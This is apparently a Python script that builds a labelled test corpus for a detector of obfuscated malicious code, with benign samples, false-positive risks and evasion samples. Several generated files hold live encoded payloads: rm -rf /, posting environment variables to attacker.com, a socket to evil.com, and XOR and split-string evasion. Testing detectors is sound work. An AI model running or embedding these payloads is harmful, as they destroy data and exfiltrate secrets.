#!/usr/bin/env python3
"""
Comprehensive test suite to evaluate detector accuracy
Tests for false positives and false negatives
"""

import base64
import os
import json
from pathlib import Path

def create_accuracy_test_suite():
    """Create test files specifically designed to test accuracy"""
    
    test_dir = Path("accuracy_tests")
    if test_dir.exists():
        import shutil
        shutil.rmtree(test_dir)
    test_dir.mkdir()
    
    (test_dir / "true_positives").mkdir()    
    (test_dir / "true_negatives").mkdir()   
    (test_dir / "false_positive_risks").mkdir() 
    (test_dir / "false_negative_risks").mkdir() 
    
    create_true_positives(test_dir / "true_positives")
    create_true_negatives(test_dir / "true_negatives")
    create_false_positive_risks(test_dir / "false_positive_risks")
    create_false_negative_risks(test_dir / "false_negative_risks")
    
    create_test_report_template(test_dir)
    
    print("Created accuracy test suite in 'accuracy_tests/' directory")
    print("\nTest categories:")
    print("- true_positives/: SHOULD be detected (malicious)")
    print("- true_negatives/: should NOT be detected (benign)")
    print("- false_positive_risks/: legitimate code that might trigger false alarms")
    print("- false_negative_risks/: sophisticated attacks that might evade detection")

def create_true_positives(dir_path):
    """Create files that SHOULD be detected as malicious"""
    
    # TP1: Direct system command execution
    malicious_cmd = "os.system('rm -rf /')"
    encoded_cmd = base64.b64encode(malicious_cmd.encode()).decode()
    
    with open(dir_path / "tp1_system_command.py", "w") as f:
        f.write(f'''
import base64
payload = "{encoded_cmd}"
exec(base64.b64decode(payload))
''')
    
    # TP2: Network data exfiltration
    exfil_code = '''
import urllib.request
import os
data = str(os.environ)
urllib.request.urlopen('http://attacker.com/collect', data=data.encode())
'''
    encoded_exfil = base64.b64encode(exfil_code.encode()).decode()
    
    with open(dir_path / "tp2_data_exfiltration.py", "w") as f:
        f.write(f'''
import base64
secret_function = "{encoded_exfil}"
exec(base64.b64decode(secret_function))
''')
    
    # TP3: Hex encoded backdoor
    backdoor = "import socket; s=socket.socket(); s.connect(('evil.com', 4444))"
    hex_backdoor = ''.join([f'\\x{ord(c):02x}' for c in backdoor])
    
    with open(dir_path / "tp3_hex_backdoor.py", "w") as f:
        f.write(f'''
# Hex encoded backdoor
payload = "{hex_backdoor}"
exec(payload)
''')
    
    # TP4: File deletion with eval
    file_deletion = "eval('__import__(\"os\").remove(\"/important/file\")')"
    url_encoded_deletion = file_deletion.replace(' ', '%20').replace('(', '%28').replace(')', '%29').replace('"', '%22')
    
    with open(dir_path / "tp4_file_deletion.py", "w") as f:
        f.write(f'''
import urllib.parse
command = "{url_encoded_deletion}"
exec(urllib.parse.unquote(command))
''')
    
    # TP5: Cryptocurrency miner
    miner_code = '''
import subprocess
import threading
def mine(): subprocess.run(['python', '-c', 'while True: hash("bitcoin")'], capture_output=True)
threading.Thread(target=mine, daemon=True).start()
'''
    encoded_miner = base64.b64encode(miner_code.encode()).decode()
    
    with open(dir_path / "tp5_crypto_miner.py", "w") as f:
        f.write(f'''
# Innocent looking performance optimizer
import base64
optimizer = "{encoded_miner}"
exec(base64.b64decode(optimizer))
''')

def create_true_negatives(dir_path):
    """Create files that should NOT be detected (legitimate uses)"""
    
    # TN1: Legitimate Base64 configuration
    config = {"database_url": "postgres://localhost:5432/mydb", "debug": False}
    config_b64 = base64.b64encode(json.dumps(config).encode()).decode()
    
    with open(dir_path / "tn1_config_storage.py", "w") as f:
        f.write(f'''
import base64
import json

# Store configuration in Base64 for obfuscation from casual viewing
CONFIG_DATA = "{config_b64}"

def load_config():
    """Load application configuration"""
    return json.loads(base64.b64decode(CONFIG_DATA).decode())

def get_database_url():
    config = load_config()
    return config['database_url']
''')
    
    # TN2: Image data in Base64
    fake_image_data = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=="
    
    with open(dir_path / "tn2_image_data.py", "w") as f:
        f.write(f'''
import base64

# Small PNG image data (1x1 transparent pixel)
IMAGE_DATA = "{fake_image_data}"

def get_default_avatar():
    """Return default avatar image as bytes"""
    return base64.b64decode(IMAGE_DATA)

def save_image(filename):
    """Save default image to file"""
    with open(filename, 'wb') as f:
        f.write(get_default_avatar())
''')
    
    # TN3: Legitimate hex data (color codes, identifiers)
    with open(dir_path / "tn3_hex_identifiers.py", "w") as f:
        f.write('''
# Color definitions in hex
COLORS = {
    'primary': '#3498db',
    'secondary': '#2ecc71', 
    'danger': '#e74c3c',
    'warning': '#f39c12'
}

# Device identifiers (fake MAC addresses)
DEVICE_IDS = [
    '00:1B:44:11:3A:B7',
    '00:50:56:C0:00:01',
    'AA:BB:CC:DD:EE:FF'
]

def get_color_rgb(color_name):
    """Convert hex color to RGB tuple"""
    hex_color = COLORS.get(color_name, '#000000')[1:]  # Remove #
    return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
''')
    
    # TN4: URL encoding for legitimate web data
    with open(dir_path / "tn4_url_encoding.py", "w") as f:
        f.write('''
import urllib.parse

# Legitimate URL-encoded form data
FORM_DATA = "name=John%20Doe&email=john%40example.com&message=Hello%20World"

def parse_form_data(encoded_data):
    """Parse URL-encoded form data"""
    return urllib.parse.parse_qs(encoded_data)

def encode_search_query(query):
    """Encode search query for URL"""
    return urllib.parse.quote(query)

# Process legitimate form submission
parsed = parse_form_data(FORM_DATA)
print("Form data:", parsed)
''')
    
    # TN5: Legitimate cryptographic operations
    with open(dir_path / "tn5_crypto_operations.py", "w") as f:
        f.write('''
import base64
import hashlib

def hash_password(password):
    """Hash password with salt"""
    salt = b'randomsalt123'
    hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    return base64.b64encode(hashed).decode()

def verify_password(password, stored_hash):
    """Verify password against stored hash"""
    return hash_password(password) == stored_hash

# Example usage
password = "user_password"
hashed = hash_password(password)
print(f"Hashed password: {hashed}")
print(f"Verification: {verify_password(password, hashed)}")
''')

def create_false_positive_risks(dir_path):
    """Create legitimate code that might trigger false positives"""
    
    # FPR1: Legitimate system administration tool
    admin_code = '''
import os
import subprocess

def get_system_info():
    """Get system information for monitoring"""
    info = {
        'user': os.getenv('USER'),
        'home': os.path.expanduser('~'),
        'cwd': os.getcwd()
    }
    return info

def restart_service(service_name):
    """Restart system service (requires admin rights)"""
    try:
        result = subprocess.run(['systemctl', 'restart', service_name], 
                              capture_output=True, text=True, check=True)
        return f"Service {service_name} restarted successfully"
    except subprocess.CalledProcessError as e:
        return f"Failed to restart {service_name}: {e}"
'''
    encoded_admin = base64.b64encode(admin_code.encode()).decode()
    
    with open(dir_path / "fpr1_system_admin.py", "w") as f:
        f.write(f'''
"""
System Administration Utility
Legitimate tool for system management
"""
import base64

# Admin functions (encoded to prevent casual modification)
ADMIN_FUNCTIONS = "{encoded_admin}"

def load_admin_functions():
    """Load administrative functions"""
    exec(base64.b64decode(ADMIN_FUNCTIONS))

# Only load if user has admin privileges
import os
if os.getuid() == 0:  # Running as root
    load_admin_functions()
''')
    
    # FPR2: Development tools with network capabilities
    with open(dir_path / "fpr2_dev_tools.py", "w") as f:
        f.write('''
import urllib.request
import json

class APITester:
    """Tool for testing REST APIs during development"""
    
    def __init__(self, base_url):
        self.base_url = base_url
    
    def test_endpoint(self, endpoint, method='GET', data=None):
        """Test API endpoint"""
        url = f"{self.base_url}/{endpoint}"
        
        if method == 'GET':
            response = urllib.request.urlopen(url)
        elif method == 'POST':
            req = urllib.request.Request(url, data=json.dumps(data).encode())
            response = urllib.request.urlopen(req)
        
        return response.read().decode()
    
    def health_check(self):
        """Check if API is responding"""
        try:
            self.test_endpoint('health')
            return True
        except:
            return False

# Development usage
api = APITester('http://localhost:8000/api')
print("API Health:", api.health_check())
''')
    
    # FPR3: File processing utility
    with open(dir_path / "fpr3_file_processor.py", "w") as f:
        f.write('''
import os
import shutil

class FileProcessor:
    """Utility for processing and organizing files"""
    
    def __init__(self, work_dir):
        self.work_dir = work_dir
    
    def clean_temp_files(self):
        """Clean temporary files"""
        temp_patterns = ['*.tmp', '*.temp', '.DS_Store']
        for pattern in temp_patterns:
            for file in os.glob(os.path.join(self.work_dir, pattern)):
                os.remove(file)
    
    def backup_files(self, backup_dir):
        """Backup important files"""
        if not os.path.exists(backup_dir):
            os.makedirs(backup_dir)
        
        for file in os.listdir(self.work_dir):
            if file.endswith(('.py', '.txt', '.json')):
                shutil.copy2(os.path.join(self.work_dir, file), backup_dir)
    
    def organize_downloads(self):
        """Organize downloaded files by type"""
        downloads = os.path.expanduser('~/Downloads')
        for file in os.listdir(downloads):
            # Move files to appropriate folders
            if file.endswith('.pdf'):
                shutil.move(os.path.join(downloads, file), 
                          os.path.join(downloads, 'PDFs', file))

# Usage
processor = FileProcessor('/tmp/workspace')
processor.clean_temp_files()
''')

def create_false_negative_risks(dir_path):
    """Create sophisticated attacks that might evade detection"""
    
    # FNR1: Obfuscated with multiple encoding layers
    inner_payload = "os.system('echo hacked')"
    first_encode = base64.b64encode(inner_payload.encode()).decode()
    second_encode = base64.b64encode(first_encode.encode()).decode()
    
    with open(dir_path / "fnr1_double_encoded.py", "w") as f:
        f.write(f'''
import base64

# Double-encoded payload
data = "{second_encode}"

def process():
    step1 = base64.b64decode(data).decode()
    step2 = base64.b64decode(step1).decode()
    exec(step2)

process()
''')
    
    # FNR2: Split across variables
    malicious = "os.system('malicious command')"
    part1 = malicious[:15]
    part2 = malicious[15:]
    encoded_part1 = base64.b64encode(part1.encode()).decode()
    encoded_part2 = base64.b64encode(part2.encode()).decode()
    
    with open(dir_path / "fnr2_split_payload.py", "w") as f:
        f.write(f'''
import base64

# Payload split across variables
part_a = "{encoded_part1}"
part_b = "{encoded_part2}"

def execute():
    full_payload = base64.b64decode(part_a).decode() + base64.b64decode(part_b).decode()
    exec(full_payload)

execute()
''')
    
    # FNR3: Custom encoding scheme
    def custom_encode(text):

        key = 42
        return ''.join([chr(ord(c) ^ key) for c in text])
    
    payload = "import subprocess; subprocess.run(['echo', 'pwned'])"
    custom_encoded = custom_encode(payload)
    
    with open(dir_path / "fnr3_custom_encoding.py", "w") as f:
        f.write(f'''
# Custom encoding scheme (XOR)
def decode(encoded_text):
    key = 42
    return ''.join([chr(ord(c) ^ key) for c in encoded_text])

payload = "{custom_encoded}"
exec(decode(payload))
''')
    
    # FNR4: Steganography in comments
    hidden_code = "eval('print(\"hidden\")')"
    
    with open(dir_path / "fnr4_steganography.py", "w") as f:
        f.write(f'''
"""
Normal looking Python file with hidden code in comments
"""

def legitimate_function():
    """This function does normal work"""
    return "normal result"

# Normal comment about the function above
# Another normal comment
# {hidden_code}  <-- This looks like a comment but could be extracted
# More normal comments

class NormalClass:
    def method(self):
        return "normal"

# The malicious code could be extracted from comments by another part of the program
import re
source = open(__file__).read()
hidden = re.findall(r'# (eval\(.*?\))', source)
if hidden:
    exec(hidden[0])
''')
    
    # FNR5: Time-delayed execution
    delayed_payload = '''
import time
import os
time.sleep(0.1)  # Short delay
os.system('echo "delayed attack"')
'''
    encoded_delayed = base64.b64encode(delayed_payload.encode()).decode()
    
    with open(dir_path / "fnr5_delayed_execution.py", "w") as f:
        f.write(f'''
import base64
import threading

def background_task():
    """Innocent looking background task"""
    payload = "{encoded_delayed}"
    exec(base64.b64decode(payload))

# Start background thread (might be missed by static analysis)
thread = threading.Thread(target=background_task, daemon=True)
thread.start()

# Main program continues normally
print("Normal program execution")
''')

def create_test_report_template(test_dir):
    """Create a template for recording test results"""
    
    with open(test_dir / "test_results.md", "w") as f:
        f.write('''# Accuracy Test Results

## Test Categories

### True Positives (Should be detected)
- [ ] tp1_system_command.py - System command execution
- [ ] tp2_data_exfiltration.py - Network data exfiltration  
- [ ] tp3_hex_backdoor.py - Hex encoded backdoor
- [ ] tp4_file_deletion.py - File deletion with eval
- [ ] tp5_crypto_miner.py - Cryptocurrency miner

**Expected: 5 detections | Actual: ___ detections**

### True Negatives (Should NOT be detected)
- [ ] tn1_config_storage.py - Legitimate config storage
- [ ] tn2_image_data.py - Image data in Base64
- [ ] tn3_hex_identifiers.py - Hex color codes
- [ ] tn4_url_encoding.py - Legitimate URL encoding
- [ ] tn5_crypto_operations.py - Password hashing

**Expected: 0 detections | Actual: ___ detections**

### False Positive Risks (Legitimate code that might be flagged)
- [ ] fpr1_system_admin.py - System administration tool
- [ ] fpr2_dev_tools.py - Development API tester
- [ ] fpr3_file_processor.py - File processing utility

**Expected: 0-1 detections | Actual: ___ detections**

### False Negative Risks (Sophisticated attacks that might evade)
- [ ] fnr1_double_encoded.py - Double-encoded payload
- [ ] fnr2_split_payload.py - Split payload across variables
- [ ] fnr3_custom_encoding.py - Custom XOR encoding
- [ ] fnr4_steganography.py - Hidden in comments
- [ ] fnr5_delayed_execution.py - Time-delayed execution

**Expected: 2-5 detections | Actual: ___ detections**

## Accuracy Metrics

- **True Positive Rate**: ___/5 = ___%
- **True Negative Rate**: ___/5 = ___%  
- **False Positive Rate**: ___/3 = ___%
- **False Negative Rate**: ___/5 = ___%

## Overall Accuracy: ___% 

## Notes:
- List any unexpected results
- Areas for improvement
- Patterns that need adjustment
''')

if __name__ == "__main__":
    create_accuracy_test_suite()